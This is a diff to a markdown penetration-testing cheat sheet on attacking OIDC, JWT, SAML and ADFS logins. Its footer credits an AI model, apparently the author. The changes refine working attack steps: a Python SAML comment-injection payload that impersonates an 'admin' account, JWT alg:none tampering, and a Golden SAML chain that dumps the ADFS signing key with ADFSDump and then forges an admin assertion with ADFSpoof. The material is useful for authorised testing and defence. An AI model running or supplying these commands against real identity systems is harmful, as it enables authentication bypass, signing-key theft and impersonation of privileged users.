@@ -171,8 +171,8 @@ OIDC adds identity layer on top of OAuth — introduces ID tokens (JWTs).
 
 ```bash
 # ID token is a JWT — apply all JWT attacks
-# Decode and check claims
-echo "<id_token>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
+# Decode claims — JWTs are base64URL (no padding, -_ alphabet), so translate first:
+echo "<id_token>" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
 
 # Key claims to tamper:
 # sub: user identifier
@@ -212,7 +212,7 @@ curl -s -X POST "https://login.microsoftonline.com/<tenant_id>/oauth2/v2.0/token
 curl -s "https://login.microsoftonline.com/<domain.com>/.well-known/openid-configuration" | python3 -m json.tool | grep issuer
 
 # Common client_ids that accept any token (public clients):
-# Microsoft Graph:  1b730954-1685-4b74-9bfd-dac224a7b894  (legacy)
+# Azure AD PowerShell: 1b730954-1685-4b74-9bfd-dac224a7b894  (legacy AAD Graph)
 # Azure CLI:        04b07795-8ddb-461a-bbee-02f9e1bf7b46
 # Azure PowerShell: 1950a258-227b-4e31-a9cf-717495945fc2
 
@@ -258,11 +258,11 @@ echo "<samlrequest_value>" | base64 -d | python3 -c "import sys,zlib; print(zlib
 ### Decode / Encode SAML
 
 ```bash
-# Decode SAMLResponse (base64 → XML)
+# Decode SAMLResponse (base64 → XML) and pretty-print
 echo "<saml_response>" | base64 -d > response.xml
-cat response.xml | python3 -m xml.dom.minidom /dev/stdin | less
+xmllint --format response.xml | less
 
-# Or with xmllint
+# One-liner
 echo "<saml_response>" | base64 -d | xmllint --format -
 
 # Re-encode after modification:
@@ -302,16 +302,15 @@ EOF
 # 8 known XSW variants (XSW1-8)
 # Use SAMLRaider (Burp extension) for automated XSW testing
 
-# 3. Comment injection
-# <!-- admin --><NameID>user@target.com</NameID>
-# Some parsers see "admin" as the NameID value, others ignore comments
-# Inject: admin<!--
+# 3. Comment injection (CVE-2017-11427 family)
+# The comment MUST be well-formed (<!---->). It splits the text node so a
+# vulnerable XML lib returns only the FIRST text chunk ("admin"), impersonating them.
+# An unclosed <!-- makes the XML invalid and the assertion won't parse.
 python3 << 'EOF'
 import base64
 xml = base64.b64decode("<saml_response>").decode()
-# Replace NameID value:
-xml = xml.replace(">user@target.com<", ">admin<!--@target.com<")
-# → NameID = "admin<!-- @target.com" (truncated at comment)
+# admin<!---->@target.com  → some libs read NameID as just "admin"
+xml = xml.replace(">admin@target.com<", ">admin<!---->@target.com<")
 print(base64.b64encode(xml.encode()).decode())
 EOF
 ```
@@ -349,16 +348,19 @@ EOF
 # PowerShell on ADFS server:
 # Get-AdfsProperties | Select -ExpandProperty SigningCertificate
 
-# ADFSDump (requires ADFS service account or DA)
+# ADFSDump — Mandiant C# binary (NOT a python script); dumps ADFS config + DKM key
 # https://github.com/mandiant/ADFSDump
-python3 ADFSDump.py -p <adfs-password>
+ADFSDump.exe            # run as the ADFS service account on the ADFS server
 
-# SharpDump ADFS cert from DKM (Distributed Key Manager) in AD
-# Requires DA or ADFS server access
+# Remote extraction alternative: WhiskeySAML (secureworks/whiskeysamlandfriends)
+# reads the DKM key + signing cert over the network given ADFS admin creds.
 
-# Forge assertion with stolen cert:
-# https://github.com/secureworks/whiskeysamlandfriends
-python3 GoldenSAML.py --cert adfs-signing.pfx --certpass <pass> --target "https://<sp>/saml/acs" --nameid "admin@target.com" --role "Admin"
+# Forge the assertion with the stolen signing key:
+#   ADFSpoof (Mandiant)  — github.com/mandiant/ADFSpoof
+#   shimit   (CyberArk)  — github.com/cyberark/shimit
+python3 ADFSpoof.py -b adfs-signing.pfx <pass> saml2 \
+  --endpoint "https://<sp>/saml/acs" --nameid "admin@target.com" \
+  --assertions '<saml:Attribute ...>Admin</saml:Attribute>'
 ```
 
 ---
@@ -378,8 +380,8 @@ curl -s -X POST "https://<authserver>/token" -d "grant_type=authorization_code&c
 # Decode SAML response
 echo "<saml>" | base64 -d | xmllint --format -
 
-# Decode OIDC/OAuth JWT token
-echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
+# Decode OIDC/OAuth JWT token (base64URL → translate before decoding)
+echo "<token>" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
 
 # alg:none on OIDC token
 python3 jwt_tool.py <token> -X a
@@ -391,5 +393,5 @@ python3 jwt_tool.py <token> -X a
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
